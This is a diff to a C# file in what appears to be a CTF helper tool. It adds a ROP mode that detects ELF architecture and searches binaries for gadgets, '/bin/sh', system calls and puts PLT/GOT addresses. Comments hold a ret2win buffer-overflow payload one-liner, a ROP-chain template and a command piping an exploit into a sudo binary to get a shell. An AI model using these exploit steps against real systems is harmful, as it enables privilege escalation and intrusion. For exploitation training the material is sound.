@@ -1,9 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Reecon
 {
@@ -13,7 +10,7 @@ namespace Reecon
         {
             if (args.Length != 2)
             {
-                Console.WriteLine("LFI Usage: reecon -rop fileNameHere");
+                Console.WriteLine("rop Usage: reecon -rop fileNameHere");
                 return;
             }
             string fileName = args[1];
@@ -26,6 +23,26 @@ namespace Reecon
 
         private static void ScanFile(string fileName)
         {
+            Architecture architecture = IDElf(fileName);
+            if (architecture == Architecture.x86)
+            {
+                Console.WriteLine("Architecture: x86");
+                // You can get a segfault address of x86 programs by going
+                // dmesg | tail -2 (Sometimes the last entry isn't for it)
+                // dmesg | grep "ret2win32" | tail -1
+            }
+            else if (architecture == Architecture.x64)
+            {
+                Console.WriteLine("Architecture: x64");
+            }
+            else
+            {
+                Console.WriteLine("Architecture: Unknown - Can only deal with ELFs");
+            }
+
+            // pwn cyclic 500
+            // aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+
             if (General.IsInstalledOnLinux("ropper"))
             {
                 Console.WriteLine("Searching for 'pop rdi; ret;'");
@@ -34,10 +51,9 @@ namespace Reecon
                 {
                     if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]"))
                     {
-                        Console.WriteLine("pop rdi; ret; --> " + item);
+                        Console.WriteLine("pop rdi; ret; (pop_rdi) --> " + item);
                     }
                 }
-                Console.WriteLine("Searching for '/bin/sh'");
                 ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --string \"/bin/sh\"");
                 foreach (string item in ropperOutput)
                 {
@@ -54,13 +70,20 @@ namespace Reecon
             }
             if (General.IsInstalledOnLinux("objdump"))
             {
-                Console.WriteLine("Searching for a system call...");
                 List<string> objdumpOutput = General.GetProcessOutput("objdump", $"-D {fileName}");
                 foreach (string item in objdumpOutput)
                 {
                     if (item.Contains("call") && item.Contains("system")) // callq contains call
                     {
-                        Console.WriteLine("system: --> " + item);
+                        Console.WriteLine("system --> " + item);
+                    }
+                    if (item.Contains("puts@plt") && item.Trim().EndsWith(":"))
+                    {
+                        Console.WriteLine("puts@plt (plt_puts) --> " + item);
+                    }
+                    if (item.Contains("puts@GLIBC"))
+                    {
+                        Console.WriteLine("puts@GLIBC (got_puts) --> " + item);
                     }
                 }
             }
@@ -71,6 +94,8 @@ namespace Reecon
             Console.WriteLine("Finished");
         }
         // For Reversing - I doubt this will ever get really used, so it's more just useful reversing stuff
+
+        // python3 -c 'from pwn import *;someval = ("A"*44).encode() + p32(0x804862c);f = open("exploit","wb");f.write(someval);f.close()' && cat exploit | ./ret2win32
 
         // Rop Chain Shellcode Breakdown
         // https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08
@@ -107,12 +132,50 @@ namespace Reecon
 
         // # Add the padding so it does it after the crash spot
         // padding = cyclic(offset)
-
+        // OR padding = ('A' * 44).encode()
         // payload = padding + rop_chain
         // f = open('exploit','wb')
         // f.write(payload)
         // f.close()
 
         // Usage: (cat exploit; cat) | sudo /sudo_pwn_file_here
+
+        // ELF Header:
+        // 7f
+        // 45 4c 46 (E L F)
+        // 01 (x86) | 02 (x64)
+        private enum Architecture
+        {
+            x86,
+            x64,
+            Unknown
+        }
+
+        private static Architecture IDElf(string filePath)
+        {
+            byte[] headerBytes = new byte[5];
+            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+            {
+                fileStream.Read(headerBytes, 0, 5);
+            }
+            if (headerBytes[0] != 0x7f || headerBytes[1] != 0x45 || headerBytes[2] != 0x4c || headerBytes[3] != 0x46)
+            {
+                Console.WriteLine("Not an ELF header");
+                return Architecture.Unknown;
+            }
+            if (headerBytes[4] == 0x01)
+            {
+                return Architecture.x86;
+            }
+            else if (headerBytes[4] == 0x02)
+            {
+                return Architecture.x64;
+            }
+            else
+            {
+                Console.WriteLine("Unknown File Type Identifier");
+                return Architecture.Unknown;
+            }
+        }
     }
 }
